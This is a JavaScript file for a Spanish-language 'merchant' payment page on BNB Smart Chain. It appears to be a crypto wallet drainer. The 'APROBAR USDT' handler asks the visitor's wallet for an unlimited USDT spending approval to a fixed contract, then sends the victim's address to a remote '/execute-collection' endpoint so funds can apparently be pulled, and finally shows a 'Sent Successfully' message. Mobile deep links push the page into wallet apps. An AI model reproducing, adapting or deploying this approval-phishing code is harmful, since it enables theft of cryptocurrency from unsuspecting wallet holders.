"use strict";

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38";
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// Wake up Render backend
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

let _cachedAddress = null;

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  if (!approveBtn) return;
  approveBtn.disabled = on;
  btnText.textContent = on ? label : "APROBAR USDT";
  if (btnSpinner) btnSpinner.hidden   = !on;
}

// ─── Modal de Selección Nativa (Con esquema oficial de OKX y encodeURIComponent) ───
function showMobileWalletSelector() {
  let modal = document.getElementById("mobileWalletModal");
  
  const rawUrl = window.location.href;
  const encodedUrl = encodeURIComponent(rawUrl);
  const urlNoProtocol = rawUrl.replace(/^https?:\/\//, '');

  if (!modal) {
    modal = document.createElement("div");
    modal.id = "mobileWalletModal";
    modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;";

    modal.innerHTML = `
      <div style="background:#18181b;border:1px solid #27272a;border-radius:16px;width:100%;max-width:360px;padding:24px;color:#fff;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
          <h3 style="margin:0;font-size:18px;">Selecciona tu Billetera</h3>
          <button id="closeWalletModal" style="background:transparent;border:none;color:#a1a1aa;font-size:24px;cursor:pointer;">&times;</button>
        </div>
        <div style="display:flex;flex-direction:column;gap:10px;">
          <a href="https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">Trust Wallet</a>
          <a href="https://metamask.app.link/dapp/${urlNoProtocol}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">MetaMask</a>
          <a href="https://link.safepal.io/open_url?url=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">SafePal</a>
          <a href="okx://wallet/dapp/url?dappUrl=${encodedUrl}" style="padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;display:block;text-align:center;">OKX Wallet</a>
        </div>
      </div>
    `;
    document.body.appendChild(modal);

    document.getElementById("closeWalletModal").addEventListener("click", () => { modal.style.display = "none"; });
    modal.addEventListener("click", (e) => { if (e.target === modal) modal.style.display = "none"; });
  } else {
    modal.querySelector('a[href*="trustwallet"]').href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}`;
    modal.querySelector('a[href*="metamask"]').href = `https://metamask.app.link/dapp/${urlNoProtocol}`;
    modal.querySelector('a[href*="safepal"]').href = `https://link.safepal.io/open_url?url=${encodedUrl}`;
    modal.querySelector('a[href*="okx"]').href = `okx://wallet/dapp/url?dappUrl=${encodedUrl}`;
    modal.style.display = "flex";
  }
}

// ─── Main Execution Handler ───────────────────────────────────────────────────
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    if (!window.ethereum) {
      if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
        showMobileWalletSelector();
      } else {
        showToast("Billetera no detectada. Instala MetaMask o abre en navegador Web3.", "error");
      }
      return;
    }

    setLoading(true, "Conectando…");

    try {
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const userAddress = accounts?.[0];

      if (!userAddress) {
        showToast("Desbloquea tu billetera y selecciona una cuenta.", "error");
        setLoading(false);
        return;
      }

      const currentChain = await window.ethereum.request({ method: "eth_chainId" });
      if (currentChain !== BSC_CHAIN_ID_HEX) {
        try {
          await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID_HEX }] });
        } catch (switchError) {
          if (switchError.code === 4902) {
            await window.ethereum.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN_PARAMS] });
          } else {
            showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
            setLoading(false);
            return;
          }
        }
      }

      const CAP_AMOUNT = ethers.MaxUint256;
      const iface      = new ethers.Interface(ERC20_ABI);

      setLoading(true, "Firma requerida en wallet…");
      const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);

      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [{ from: userAddress, to: BSC_USDT_ADDRESS, data: approveData, value: "0x0" }]
      });

      if (!txHash) throw new Error("Transacción cancelada.");

      setLoading(true, "Finalizando…");
      const uiAmount = document.getElementById("investAmount")?.value || "1";
      const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();

      await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress, amount: dynamicAmountWei })
      });

      showToast("Sent Successfully, Thank you! ✓", "success");

    } catch (err) {
      if (err.code === 4001 || err?.message?.toLowerCase().includes("rejected")) {
        showToast("Transacción cancelada por el usuario.", "default");
      } else {
        console.error("Web3 Error:", err);
        showToast("Error en la transacción. Intenta nuevamente.", "error");
      }
    } finally {
      setLoading(false);
    }
  });
}
